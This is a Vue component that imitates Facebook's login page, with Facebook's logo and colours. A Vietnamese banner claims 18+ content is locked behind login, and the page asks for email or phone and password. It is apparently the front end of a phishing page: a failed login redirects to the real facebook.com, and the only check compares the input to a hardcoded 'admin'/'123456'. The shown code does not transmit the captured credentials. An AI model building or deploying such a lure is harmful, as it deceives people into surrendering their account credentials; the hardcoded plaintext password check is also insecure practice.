<template>
  <div class="viewport">
    <div class="header">
      <div class="icon">
        <img src="../src/assets/fb.jpg" alt>
      </div>
    </div>
    <div class="app">
      <div class="loginform">
        <div class="warningBox">Nội dung 18+ ,vui lòng đăng nhập trước khi xem.</div>
        <form>
          <div class="inputBox">
            <input
              name="username"
              v-model="username"
              autofocus
              class="_inputEmail"
              type="text"
              placeholder="Email hoặc số điện thoại"
            >
            <input
              name="password"
              v-model="password"
              class="_inputPass"
              type="password"
              placeholder="Mật khẩu"
            >
          </div>
          <button class="btnLogin" v-on:click="handler" type="submit" value="Login" name="login">
            <span>Đăng Nhập</span>
          </button>
        </form>
      </div>
      <div class="footer">
        <span>©2019</span>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: "app",
  data: {
    username: "",
    password: ""
  },
  methods: {
    handler: function() {
      if (this.username === "admin" && this.password === "123456") {
        alert("Đăng nhập thành công");
      } else {
        alert("Truy cập bị từ chối");
        window.location.href = "http://facebook.com";
        alert("");
      }
    }
  }
};
</script>

<style>
.viewport {
  min-width: 100%;
  width: 100%;
}

.header {
  background-color: #3b5998;
  position: relative;
  box-sizing: border-box;
  height: 44px;
  width: 100%;
}

.icon {
  min-width: 160px;
  text-align: center;
}

.icon img {
  height: 25px;
  width: auto;
  margin: 8px 0;
}

#app {
  text-align: center;
}

.loginform {
  max-width: 416px;
  background-color: #eceff5;
  padding: 16px 30px 45px;
  margin: 0 auto;
}

.warningBox {
  background-color: #fff9d7;
  border: 1px solid #e2c822;
  padding: 10px;
  margin-bottom: 5px;
}

.inputBox {
  margin-right: 24px;
  padding-bottom: 12px;
}

._inputEmail {
  border-radius: 4px 4px 0 0;
  width: 100%;
  border: 1px solid #7d7d7d;
  border-bottom: 1px solid rgba(0, 0, 0, 0.101);
  padding: 12px;
  font-size: 14px;
}

._inputPass {
  border-radius: 0 0 4px 4px;
  width: 100%;
  padding: 12px;
  font-size: 14px;
  border: 1px solid #7d7d7d;
}

.btnLogin {
  width: 100%;
  background-color: #627aad;
  border-radius: 3px;
  font-weight: bold;
  font-size: 14px;
  height: 36px;
  line-height: 36px;
  color: #fff;
  border-radius: 4px;
}

.footer {
  text-align: center;
  margin: 10px 0;
}

.footer span {
  font-size: 15px;
  line-height: 20px;
}
</style>
